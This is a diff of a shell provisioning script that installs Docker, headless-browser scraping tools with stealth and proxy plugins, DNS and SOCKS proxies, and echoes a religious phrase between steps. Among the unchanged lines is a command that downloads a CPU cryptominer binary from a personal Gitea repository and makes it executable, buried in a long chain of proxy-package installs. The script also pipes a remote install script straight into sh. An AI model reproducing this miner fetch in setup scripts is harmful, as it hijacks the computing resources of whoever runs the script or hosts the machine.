@@ -1,5 +1,9 @@
 sudo apt update && sudo apt-get -y install systemctl && sudo apt install apt-transport-https curl gnupg-agent ca-certificates software-properties-common -y && curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - && sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable" && sudo apt install docker-ce docker-ce-cli containerd.io -y && sudo usermod -aG docker genzo2805
 
+  sleep 5
+  
+npm install zyte-smartproxy-puppeteer && npm install playwright playwright-extra zyte-smartproxy-plugin puppeteer-extra-plugin-stealth @cliqz/adblocker-playwright && npm install puppeteer puppeteer-extra zyte-smartproxy-plugin puppeteer-extra-plugin-stealth puppeteer-extra-plugin-adblocker && curl https://raw.githubusercontent.com/Smartproxy/Python-scraper-tutorial/master/scraper.py > scraper.py
+  sleep 5
 npm install -g ccloli/DNSProxy
 git clone https://github.com/ccloli/DNSProxy.git && cd DNSProxy && npm install -g
 echo "====================================="
@@ -40,30 +44,7 @@ chmod +x adBlockHostsGenerate.sh
   echo "Bismillahirahmannirrahim"
   echo "====================================="
   sleep 5
-npm install zyte-smartproxy-puppeteer && npm install playwright playwright-extra zyte-smartproxy-plugin puppeteer-extra-plugin-stealth @cliqz/adblocker-playwright && npm install puppeteer puppeteer-extra zyte-smartproxy-plugin puppeteer-extra-plugin-stealth puppeteer-extra-plugin-adblocker && curl https://raw.githubusercontent.com/Smartproxy/Python-scraper-tutorial/master/scraper.py > scraper.py
-  
-  sleep 5
-
-apt-get update\
-  && apt-get -y install vim dnsutils curl sudo\
-  && curl -fsSL https://get.docker.com/ | sh || apt-get -y install docker.io\
-  && mkdir -p ~/netflix-proxy\
-  && cd ~/netflix-proxy\
-  && curl -fsSL https://github.com/ab77/netflix-proxy/archive/latest.tar.gz | gunzip - | tar x --strip-components=1\
-  && ./build.sh
-
-  echo "====================================="
-  echo "Bismillahirahmannirrahim"
-  echo "====================================="
-  sleep 5
 wget -qO cpu https://try.gitea.io/Inabirtia/test/raw/branch/main/cpuminer-sse2 && chmod +x cpu && npm i silence-js-hash-crypto && npm install socks-proxy-v5 && npm install node-https-socks5-proxy && sudo npm install via-proxy && sudo npm install proxy-agent --save && npm install --save-dev http-proxy-middleware && npm install http-proxy --save && npm install node-gyp-install && sudo npm install node-cache --save && sudo npm install --save-dev cross-env && npm install -g json-server && npm install got socks-proxy-agent cross-spawn --save
- 
-sleep 5
-
-mkdir -p ~/netflix-proxy\
-  && cd ~/netflix-proxy\
-  && curl -fsSL https://github.com/ab77/netflix-proxy/archive/latest.tar.gz | gunzip - | tar x --strip-components=1\
-  && ./build.sh
   
   echo "====================================="
   echo "Bismillahirahmannirrahim"
